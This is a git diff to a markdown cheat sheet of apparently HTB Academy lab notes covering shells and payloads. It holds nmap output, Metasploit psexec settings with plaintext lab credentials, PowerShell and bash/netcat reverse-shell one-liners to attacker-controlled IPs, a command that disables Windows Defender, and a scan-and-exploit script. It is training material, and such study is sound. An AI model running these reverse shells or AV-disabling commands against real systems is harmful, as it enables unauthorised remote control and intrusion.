@@ -255,17 +255,134 @@ curl -I 'https://i.imgur.com'
 
 # target -
 # Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 
-
+7.2.1
 
 ```
 
+### Shells & Payloads
 
+```bash
+sudo nc -lvnp 443
+```
 
+```bash
+xfreerdp /v:<target IP address> /u:htb-student /p:HTB_@cademy_stdnt!
+xfreerdp /v:10.129.17.161 /u:htb-student /p:HTB_@cademy_stdnt!
+/port:2179
+```
 
+```bash
+ nmap -sC -sV -Pn 10.129.27.76
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-16 22:48 BST
+Nmap scan report for 10.129.27.76
+Host is up (0.068s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: 10.129.27.76 - /
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-06-16T14:48:13-07:00
+| smb2-time: 
+|   date: 2024-06-16T21:48:12
+|_  start_date: 2024-06-16T20:49:02
+|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.29 seconds
 
+```
 
+```bash
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+RHOSTS => 10.129.180.71
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+SHARE => ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
+SMBPass => HTB_@cademy_stdnt!
+msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
+SMBUser => htb-student
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
+LHOST => 10.10.14.222
+# 10.10.14.253
+```
 
+#### Reverse Shell
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+#### Disable AV
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+#### Netcat/Bash Reverse Shell One-liner
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+```
+
+#### Open a connection with netcat
+```bash
+nc 10.10.14.12 7777 > /tmp/f  
+```
+
+#### NMAP Scan
+```bash
+nmap -sC -sV -Pn 10.129.201.160
+```
+
+#### Msfconsole Target Discovery and Exploit
+```bash
+nmap -sC -sV -Pn 10.129.27.76 -oX nmap_scan.xml
+msfconsole
+db_import nmap_scan.xml
+hosts
+services
+use auxiliary/scanner/exploit/windows/scan
+set RHOSTS 10.129.27.76
+run
+search type:exploit name:iis version:10.0
+```
+
+scan_and_exploit.sh script
+```bash
+#!/bin/bash
+
+# Run Nmap scan and save the output
+nmap -sC -sV -Pn 10.129.27.76 -oX nmap_scan.xml
+
+# Start Metasploit console and run commands
+msfconsole -q -x "
+db_import nmap_scan.xml;
+use auxiliary/scanner/exploit/windows/scan;
+set RHOSTS 10.129.27.76;
+run;
+exit;"
+```
+
+### Command Injections
+```bash
+# target - 94.237.63.201:33153
 ```
 
